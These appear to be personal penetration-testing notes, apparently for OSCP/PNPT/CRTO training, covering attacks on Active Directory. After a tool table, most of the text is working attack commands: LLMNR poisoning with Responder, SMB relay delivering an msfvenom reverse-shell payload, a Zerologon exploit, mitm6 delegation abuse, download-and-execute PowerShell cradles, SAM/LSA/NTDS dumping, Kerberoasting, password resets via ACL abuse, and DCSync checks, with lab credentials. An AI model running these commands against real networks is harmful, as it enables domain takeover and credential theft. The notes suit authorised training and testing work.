# Pentesting-Notes
These are my personal penetration testing notes from taking examinations from pnpt, oscp, and crto
# Tools of the Trade

Many of the module sections require tools such as open-source scripts or precompiled binaries. Where applicable, these can be found in the `C:\Tools` directory on the Windows hosts provided in the sections aimed at attacking from Windows. In sections that focus on attacking AD from Linux we provide a Parrot Linux host customized for the target environment as if you were an anonymous user with an attack box within the internal network. All necessary tools and scripts will be preloaded on this host.  Here is a listing of many of the tools that we will cover in this module:
  
| Tool              | Description |  
| ----------------- | ----------- |  

# Active Directory
| Tool              | Description |  
| ----------------- | ----------- |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)/[SharpView](https://github.com/dmchell/SharpView) | A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows `net*` commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |  
| [BloodHound](https://github.com/BloodHoundAD/BloodHound) | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors) PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a [Neo4j](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors) database for graphical analysis of the AD environment. |  
| [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) | The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis. |  
| [BloodHound.py](https://github.com/fox-it/BloodHound.py) |  A Python-based BloodHound ingestor based on the [Impacket toolkit](https://github.com/CoreSecurity/impacket/). It supports most BloodHound collection methods and can be run from a non-domain joined attack box. The output can be ingested into the BloodHound GUI for analysis. |  
| [Kerbrute](https://github.com/ropnop/kerbrute)  | A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts and perform password spraying and brute forcing. |  
| [Impacket toolkit](https://github.com/SecureAuthCorp/impacket)  |  A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory. |  
| [Responder](https://github.com/lgandx/Responder) | Responder is a purpose built tool to poison LLMNR, NBT-NS and MDNS, with many different functions. |   
| [Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1) | Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks. |  
| [C# Inveigh (InveighZero)](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh) | The C# version of Inveigh with with a semi-interactive console for interacting with captured data such as username and password hashes. |  
| [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) | A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.  |    
| [CrackMapExec (CME)](https://github.com/byt3bl33d3r/CrackMapExec)  | CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols such as SMB, WMI, WinRM, and MSSQL. |  
| [Rubeus](https://github.com/GhostPack/Rubeus) |  Rubeus is a C# tool built for Kerberos Abuse.  |  
| [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) | Another Impacket module geared towards finding Service Principal names tied to normal users. |  
| [Hashcat](https://hashcat.net/hashcat/)           | A great hashcracking and password recovery tool. |  
| [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) | A tool for enumerating information from Windows and Samba systems. |  
| [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) | A rework of the original Enum4linux tool that works a bit differently. |  
| [ldapsearch](https://linux.die.net/man/1/ldapsearch) | Built in interface for interacting with the LDAP protocol. |  
| [windapsearch](https://github.com/ropnop/windapsearch) |   A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries. |  
| [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray) | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. |  
| [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) | The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).  |  
| [smbmap](https://github.com/ShawnDEvans/smbmap) | SMB share enumeration across a domain. |  
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) | Part of the Impacket toolset, it provides us with psexec like functionality in the form of a semi-interactive shell. |  
| [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) | Part of Impacket toolset, it provides the capability of command execution over WMI. |  
| [Snaffler](https://github.com/SnaffCon/Snaffler) | Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares. |  
| [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) | Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network. |  
| [setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) | Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account. |  
| [Mimikatz](https://github.com/ParrotSec/mimikatz) | Performs many functions. Noteably, pass-the-hash attacks, extracting plaintext passwords, and kerberos ticket extraction from memory on host. |  
| [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) | Remotely dump SAM and LSA secrets from a host. |  
| [evil-winrm](https://github.com/Hackplayers/evil-winrm) | Provides us with an interactive shell on host over the WinRM protocol. |  
| [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) | Part of Impacket toolset, it provides the ability to interact with MSSQL databases. |  
| [noPac.py](https://github.com/Ridter/noPac) | Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user. |  
| [rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py) | Part of the Impacket toolset, RPC endpoint mapper. |  
| [CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py) | Printnightmare PoC in python. |  
| [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) | Part of the Impacket toolset, it performs SMB relay attacks. |  
| [PetitPotam.py](https://github.com/topotam/PetitPotam) | PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions. |  
| [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) | Tool for manipulating certificates and TGTs. |  
| [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py) | This tool will use an existing TGT to request a PAC for the current user using U2U. |  
| [adidnsdump](https://github.com/dirkjanm/adidnsdump) | A tool for enumeration and dumping of DNS records from a domain. Similar to performing a DNS Zone transfer. |  
| [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) | Extracts usernames and passwords from Group Policy preferences. |  
| [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) | Attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set. |  
| [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) | SID bruteforcing tool. |  
| [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) | A tool for creation and customization of TGT/TGS tickets. |  
| [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) | Part of the Impacket toolset, It is a tool for child to parent domain privilege escalation. |  
| [Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) | Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for off-line analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions. |  
| [PingCastle](https://www.pingcastle.com/documentation/) | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security). |  
| [Group3r](https://github.com/Group3r/Group3r) | Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).          |  
| [ADRecon](https://github.com/adrecon/ADRecon) | A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state. |  

## Pre Compromise AD Enum
 

SMB Relay Attack (relay cracked hashes to other machines to gain access and obtain SAM 

Disable SMB and HTTP in the resonder.conf file (sudo nano /usr/share/responder/Responder.conf) 

Open 
[Responder Core] 
1 
3 ; Servers to start 
4 SOL = on 
5 SMB Off 
7 Kerberos = On 
8 FTP = on 
9 pop on 
lø SMTP on 
11 1%AP - on 
12 HTTP = Of 
13 HTTPS on 
14 DNS = On 
15 LDAP on 
16 DCERPC on 
17 WINRM = on 
•Responder.conf 
navigate to respective folder in kali as the SAM file will save where the command is ran from 

Responder: (Attack LLMNR/NBT-NS) 

Analyze mode - sudo responder -I INTERFACE -A 

Poison mode - sudo responder -I INTERFACE -wFvP 

Inveigh: (Responders equivalent, but must be ran as admin) 

Import-Module .\Inveigh.ps1 

(Get-Command Invoke-Inveigh).Parameters 

LLMNR and NBNS spoofing, and output to the console and write to a file 

Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y 

Inveigh.exe 

Press ESC to enter/exit interactive console or HELP 

GET NTLMV2UNIQUE,  GET NTLMV2USERNAMES 

To prevent: 

image
 

SMB Relay attack: 

In another terminal: 

check to see if vulnerable - nmap --script=smb2-security-mode.nse -p445 DC_IP 

Single IP for DC - ntlmrelayx.py -t IP -smb2support 

Multiple DCs - ntlmrelay.py -tf targets.txt -smb2support 

Run a command - ntlmrelay.py -t IP -smb2support -c "whoami" 

To generate traffic - On a machine outside of the targets.txt file, navigate to kali: 

Create fake html limk to attacker, once they click..you will get username and hash of password 

If successful - SAM is captured: 

Copy and paste hashes in a file for hashcat 

Get Revshell if interactive SMB client shell via TCP on 127.0.0.1:PORT (This will be displayedf via the screenshot above) 

nc 127.0.0.1 PORT 

help 

 

Enum domain: 

ADenum 

Python ADenum.py -d DOMAIN –u USER –p PASSWORD -j 

ADautomator 

Start ldapnomnom: 

ldapnomnom --server DC_IP --input /use/share/seclists/Usernames/xato-net-10-million-usernames.txt 

Identify all computers on Domain: 

netexec smb 192.168.98.0/24 -u '' -p '' --users --continue-on-success 

Multiple computers - netexec smb 10.11.1.120 10.11.1.121 10.11.1.122 10.11.1.123 -u '' -p '' --users --continue-on-success 

Use a hash - netexec smb 10.11.1.0/24 -u pete -H 0f951bc4fdc5dfcd148161420b9c6207 --shares 

netexec smb 192.168.98.0/24 -u '' -p '' --shares --local-auth   ## Try with and without –local-auth 

netexec smb 192.168.98.0/24 -u '' -p '' --pass-pol 

netexec smb 192.168.98.0/24 -u '' -p '' --users 

netexec smb 192.168.98.0/24 -u '' -p '' --sam --continue-on-success 

netexec smb 192.168.98.0/24 -u '' -p '' --lsa --continue-on-success 

netexec smb 192.168.98.0/24 -u '' -p '' --ntds --continue-on-success 

netexec smb 192.168.98.0/24 -u '' -p '' --kerberoast kerberoast_output.txt --continue-on-success 

netexec smb 192.168.98.0/24 -u '' -p '' --ntds vss --continue-on-success 

netexec smb 192.168.98.0/24 -u '' -p '' --ntds-history --continue-on-success 

 

netexec smb/winrm/mysql/ssh/ldap IP -u users.txt -p wordlist.txt --continue-on-success  

add domain "taupe.local" to etc /hosts file 

Command execution: 

Cmd.exe  - netexec smb 192.168.98.0/24 -u '' -p '' -x 'whoami' --exec-method smbexec     ## try without the --exec flag…default it atexec 

Powershell.exe  - netexec smb 192.168.98.0/24 -u '' -p '' -X 'whoami' --exec-method smbexec    ## try without the --exec flag…default it atexec 

Create Usernames -  

./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl,f.last,lastf > usernames.txt 

Status_Password_Must_Change: 

smbpass -U USER -r IP 

 

Scan and discover hosts vulnerable to no SMB signing 

sudo nmap --script smb2-security-mode.nse -p 445 IP.0/24 

Servers are enabled and required 

Machines are vulnerable due to SMB not being required 

 

If vulnerable see Kerberoasting and SMB relay attacks. 

SMB Attack (Fake WPAD): 

Send a payload and get a meterpreter shell 

sudo ntlmrelayx.py -tf targets.txt -smb2support -e PAYLOAD.exe 

impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e POWERSHELL COMMAND FROM REVSHELL.com' 

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.98.130 LPORT=4444 -f exe > PAYLOAD.exe 

Start a meterpreter session 

Qq 

 

navigate to a target to pass the SMB relay 

SMB ATTACK with a Interactive shell: 

sudo ntlmrelayx.py -tf targets.txt -smb2support -i 

if there is only one target, just up the IP above 

generate traffic from machine other than the target 

a shell is created. Open a terminal in either port- nc 127.0.0.1 11000 

to view help- help 

to view shares - shares 

connect to share - C$ 

 

Check DC for zero logon  here (REAL PENTESTS...DO NOT USE, just report): 

Only for the DC- python3 zerologon_check.py COMPUTER_NAME IP 

If exploitable: 

python3 cve-2020-1472-exploit.py DC_NAME DC_IP 

sudo secretsdump.py -just-dc DOMAIN/DC_NAME\$@IP_of_DC 

Crack via hashcat - see Password Attacks - NTLM section 

to restore (ensure impacket is up to date or hex wont dump): 

sudo secretsdump.py administrator@IP_of_DC -hashes HASH_of_ADMIN 

Copy and paste the plain text Hex in the command below 

python3 restorepassword.py DOMAIN/DC@DC -target-ip IP_OF_DC -hexpass HEXPASS_PLAINPASS_HERE 

 

MITM6 

Create user account 

ntlmrelayx.py -6 -t ldaps://IP-of-DC -wh fakewpad.taupe.local -l lootme 

sudo python3 mitm6.py -d DOMAIN 

check the lootme folder for info - domain users (description) 

Once an admin logs in, check the ntlmrelay screen for username and password 

******Do not leave running for longer than 5 to 10 minutes 

Create Computer account with Kerberos delegate 

Create computer - ntlmrelayx.py -t ldaps://DOMAIN --add-computer 

sudo mitm6 -hw DOMAIN FROM CREATED COMPUTER -d DOMAIN --ignore-nofqnd 

ntlmrelayx.py -t ldaps://DOMAIN -wh attacker-wpad --delegate-access 

If successful: 

getST.py -spn cifs/NEWCOMPUTERNAME.DOMAIN DOMAIN/NEWUSERFROMABOVE -impersonate USER 

Export KRB5CCNAME=admin.ccache 

Secretsdump.py -k -no-pass DOMAN 

## Post Compromise AD Enum
Check for constrained language - if not "FullLanguage", powershell will be limited 

$ExecutionContext.SessionState.LanguageMode 

Adautomator 

 

adpeas.ps1 from here (I changed the case in adPEAS.ps1) 

powershell -ep bypass 

Import-Module .\adpeas.ps1 

or 

. .\adpeas.ps1 

or 

gc -raw .\adpeas.ps1 | iex 

or 

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1') 

Invoke-adPEAS 

Invoke-adPEAS -Domain 'contoso.com' 

 

ADRecon: 

powershell -ep bypass 

Import-Module .\ADRecon.ps1 

If able to access w/o EDR - .\ADRecon.ps1 -OutputDir <select Dir> -OutputType HTML 

EDR exsists - run in memory w/ powershell 

 

Powerview: Once access is acquired, get .ps1 from the recon folder or here. Cheeatsheet here and here 

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1') 

If import script is not on the bottom of powerview, run the below 

powershell -ep bypass 

Import-Module .\powerview.ps1 

 

run powerview.ps1 file - . .\PowerView.ps1 

If the powershells won't run use the auto download and run command from the explotation folder 

or - Import-Module .\powerview.ps1 

 

Check access: 

Get-DomainGPO |select displayname 

Get-GPO -All | Select DisplayName 

 

Local Users: 

Get-NetUser | select cn 

Get-NetUser | select samaccountname 

Get-NetUser | select description 

Get-NetGroupMember -GroupName "Domain Admins" -Recurse         (if error arrises, remove the recurse) 

Get-DomainComputer | Test-AdminAccess 

Test-AdminAccess 

Look for disabled accounts in AD - et-ADUser -Filter {Enabled -eq $false} -Properties Description | Select-Object Name, SamAccountName, Description 

Disabled accounts locally - Get-NetUser -Filter {Enabled -eq $false} | Select-Object SamAccountName, Description 

 

Domain Users: 

Check for clear text password – if so, impacket-secretsdump or netexec –ntds for DCSYNC (): 

Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol 

Check for no pre authentication - PASSWD_NOTREQD (run kerbrute on the DC). Everything doesn’t show in adpeas 

Get-ADUser -Filter {PasswordNotRequired -eq $true -and Enabled -eq $true} | Select SamAccountName 

Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol 

Check for DONT_REQ_PREAUTH: 

Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl  

.\Rubeus.exe asreproast /user:<USER_THAT_COMES_BACK_FROM_ABOVE>/nowrap /format:hashcat  

Kerbrute userenum 

GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users  

Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat 

pingGet-NetDomain 

Get-DomainGroup -Domain <output from above> 

Get-Domainuser -Properties samaccountname description 

Get user SID - Get-Domain 

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName    ## This will set us up for kerberoastable accounts 

Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol 

Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName,name 

Check for RDP access: 

Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"  

 

(Get-DomainPolicy)."systemaccess" 

check for account lockoutGet-Net 

password length 

 

Domain Groups: 

Get-NetGroup | select name,description 

Find the admins so we can tgt them - Get-DomainGroupMember -Identity "Domain Admins" -Recurse 

Find the admins so we can tgt them - Get-DomainGroupMember -Identity "Administrators" -Recurse 

Get-ADGroup -Filter * | select name 

ID who has admin access -Get-ADGroupMember -Identity "Administrators" 

ID other members if there are interesting groups  

 

Domain: 

wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress 

Import-Module ActiveDirectory 

Get-Module 

Get-ADDomain 

Get-DomainComputer 

Get-DomainTrustMapping  

ID trusts and other domains: 

Import-Module activedirectory  

Get-ADTrust -Filter * 

Get-DomainTrust  

Get-DomainTrustMapping 

Run all commands in the Domain User section with the "-Domain NEW_DOMAINs" 

Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName  

computer information on the domain - Get-NetComputer | select XXXX 

Get-NetComputer -Ping 

Get-NetDomainController 

Test-AdminAccess -ComputerName ACADEMY-EA-MS01  

Invoke-ShareFinder 

Get-NetLoggedon 

Get-NetLoggedon -ComputerName COMPUTERNAME 

File Shares: 

Invoke-FileFinder -verbose 

Local - Get-NetShare 

Local - Get-NetShare 

Domain -   Find-DomainShare –verbose 

ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts 

cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs 

 

Get-DomainFileServer 

Get-DomainDFSShare 

 

 

ACL and ACE Enumeration 

Import-Module .\PowerView.ps1 

Get the GUID value to see permissions (Manualy): 

$sid = Convert-NameToSid USER 

Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

Manually Google the "ObjectAceType" 

Lookup GUID via reverse search: 

$guid ="GUID" 

$guid= "00299570-246d-11d0-a768-00aa006e0529"  

Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl  

 

 

Get ACE in human readable format (Automated): 

$sid = Convert-NameToSid USER 

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

Create or import user list: 

Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt 

Check for permissions for each user: 

foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\USER'}} 

Once we ID new user as above, use powerview to resolve GUID: 

 $sid2 = Convert-NameToSid damundsen 

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose 

Investigate the new group - Get-DomainGroup -Identity "Help Desk Level 1" | select memberof  

Investigate the new group of "Information Technology": 

$itgroupsid = Convert-NameToSid "Information Technology"  

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose 

Further enumerate new user that new accesses: 

$adunnsid = Convert-NameToSid adunn 

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose  

We can see this new user adunn has DS-Replication=DCSync Attack. We need to escalate to this new user 

Check for GenericAll permissions (must be in a AD domain): 

Check users; 

whoami 

net users 

Check GenericAll permission: 

Get-ObjecAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIndentifier -match '<SID of user>')} 

Annote SID 

Check Domain Admins - GetObjectAcl -SamAccountName 'Domain Admins' -ResolveGUIDs 

Get admin SID - Get-DomainGroup -Name 'Domain Admins' 

 

Sharpview.exe: (Use if powershell is not working) 

.\SharpView.exe Get-DomainUser -Help  

.\SharpView.exe Get-DomainUser -Identity forend  

Manual Enum: 

User Enumeration: 

echo %USERNAME% || whoami 

whoami 

whoami /priv 

whoami /groups 

whoami /all 

net user 

If "key admins" - see shadow attack 

net user /domain 

Enumerate the users- net user USER 

Locate if they are in the admin group 

net group /domain 

net user /domain 

net accounts /domain 

net localgroup Administrators 

net group "domain computers" /domain 

net accounts 

net user admin 

net user administrator 

net localgroup 

net group "Domain Controllers" /domain 

net group "Administrators" /domain 

 

net localgroup administrators /domain 

 

net view /all /domain[:domainname] 

net localgroup administrators 

netdom query /domain:inlanefreight.local workstation  

Get Domain data: 

Get-BN[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 

Meterpreter enumeration 

search -f win.ini 

search -f *tomcat-users* 

search -f *password* 

search -f *passwords* 

run post/windows/gather/enum_files FILE_GLOBS=*tomcat* .xml SEARCH_FROM=C:\\ 

Bloodhound to automate:  

***NOTE- if using sharphound.ps1, must use bloodhound 3.0.5 in /opt/bloodhound folder**** 

To install: 

sudo apt install bloodhound 

sudo neo4j console 

Lost password for neo4j 

login with neo4j for user and pass and then change password 

User=neo4j 

Password=password 

exit browser 

 

Run: 

sudo neo4j console 

run bloodhound - bloodhound --no-sandbox 

Ingester from Target: 

get sharphound as an ingester from here 

transfer sharphound to target 

Ingester from KALI (Creds required) 

sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 

bloodhound -d heist.offsec -u enox -p california -c all -ns 192.168.110.165 

On target: 

Sharphound: 

See example from HTB Academy (ACL Abuse Tactics): 

Without creds - sharphound.exe -c all --domain za.tryhackme.com --zipfilename NAME.zip 

With creds - .\sharphound.exe -c All --zipfilename inlane --ldapusername htb-student --ldappassword Academy_student_AD! 

run - powershell -ep bypass 

run - . .\sharphound.ps1 -c all 

or- Import-Module .\sharphound.ps1 

run - Invoke-Bloodhound -CollectionMethod ALL -Domain DOMAIN -ZipFileName file.zip 

move file back to kali and load into bloodhound via upload button on right side 

Mark machines and users tuplhat have been compromised via search bar 

can these machines reach HVTs? 

Check Outbound Object Control 

Right click the line and select help 

Review abuse info and replicate: 

ForceChangePassword: We have the ability to set the user's current password without knowing their current password. Use the Username of the output in bloodhound. 

Create PSCredential Object (Create a user that we have already compromised): 

$SecPassword = ConvertTo-SecureString 'USERS_PASSWORD' -AsPlainText -Force 

$Cred = New-Object System.Management.Automation.PSCredential('inlanfreight\wley', $SecPassword) 

Create SecureString Object (Change the user that we can change the password of): 

$User_to_changePassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force 

 

Change Users Password via PowerView: 

Powershell –ep bypass 

Import-Module .\PowerView.ps1 

Set-DomainUserPassword -Identity USER_to_change -AccountPassword $User_to_changePassword -Credential $Cred -Verbose 

 

CanRDP 

lsadump::pth /user:dfm /domain:testlab.local /ntlm:<ntlm hash> /run:"mstsc.exe /restrictedadmin" 
 

Xfreerdp or reminna using proxychains or ligolo 

 

CanPSRemote 

From a GUI - Authenticate to server as user with CanPSRemote access: 

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force  

$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)  

$session = New-PSSession -ComputerName <target computer name> -Credential $Cred  

Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}  

Cleanup: 

Disconnect-PSSession -Session $session 

Remove-PSSession -Session $session  
 

SQLAdmin: 

Check for SQLAdmin via custom query - MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2 

 

AddMembers: We have the ability to add users (including our own account), groups or computers to the target group. 

GenericAll: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group. 

Method 1: 

Standin.exe --computer cb --make 

Copy output/password to clipboard 

Get SID of new computer - Get-ADComputer -Filter * | Select-Object Name, SID 

Impersonate Computer: 

.\StandIn_v13_Net45.exe --computer ORIGINAL_COMPUTER_NAME --SID SID_OF_NEW_COMPUTER 

.\StandIn_v13_Net45.exe --computer RESOURCEDC --SID S-1-5-21-537427935-490066102-1511301751-4101 

Get MD4 of password created in step a: (Output goes in step f) 

python3 

import hashlib,binascii 

hash = hashlib.new('md4', "d94FZEiyrdv14sS".encode('utf-16le')).digest() 

print(binascii.hexlify(hash)) 

Create ticket - .\rubeus.exe s4u /user:cb /rc4:d814345c1cb4b27dd52694ed61eb0ede /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /nowrap /ptt 

Verify - klist 

Create ticket from base64 output: (Use the "Impersonating user 'administrator' to target SPN 'cifs/resourcedc.resourced.local" ticket) 

ensure hosts file on kali matches step h 

copy output of "Impersonating user 'administrator' to target SPN 'cifs/DOMAIN" ticket to kali > ticket.b64 

cat ticket.b64 | base64 -d > ticket.kirbi 

impacket-ticketConverter ticket.kirbi ticket.ccache 

export KRB5CCNAME=`pwd`/ticket.ccache 

psexec: 

impacket-psexec -k -no-pass resourced.local/administrator@resourcedc.resourced.local -dc-ip 192.168.137.175 

psexec.py -k -no-pass resourced.local/administrator@resourcedc.resourced.local -dc-ip 192.168.137.175 

Method 2: (Create a Fake SPN) 

import-module .\powerview.ps1 

Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='cb/user'} -Verbose 

 

verfify new SPN: 

Get-DomainObject -Identity NAMEOFUSERTRYINGTOIMPERSONATE 

It works:  

 

Get SPN Ticket: 

Get-DomainSPNTicket cb/user | fl 

The user will be cb/user, but the actual username will be whats on bloodhound 

or 

Get-DomainSPNTicket -Credential $Cred2 NAMEOFUSERTRYINGTOIMPERSONATE  | fl 

or 

.\Rubeus.exe kerberoast /user:adunn /nowrap  

Cleanup: 

Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose  

Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose  

Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose  

 

GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on. 

If you have powerview already loaded, keep current session, if not: 

Powershell –ep bypass 

Import-Module .\PowerView.ps1 

Creating a Securestring Object: 

$SecPassword = ConvertTo-SecureString 'PASSWORD_of_USER' -AsPlainText -Force    ## if you changed the password from force change password, use that 

$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\USER', $SecPassword)  

 

Confirm that the member is not part of the group we need them to be in: 

Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members 

or 

Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName  

Add member to group: 

Add-DomainGroupMember -Identity 'Help Desk Level 1 ' -Members 'damundsen' -Credential $Cred2 -Verbose 

 

Check to see if user is added to the group: 

Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName  

WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object. 

DCSync: 

Identify access to DCSync: 

Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl  

Get sid from previous command - $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"  

Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl  

If we have access=DS-Replication-Get-Changes... 

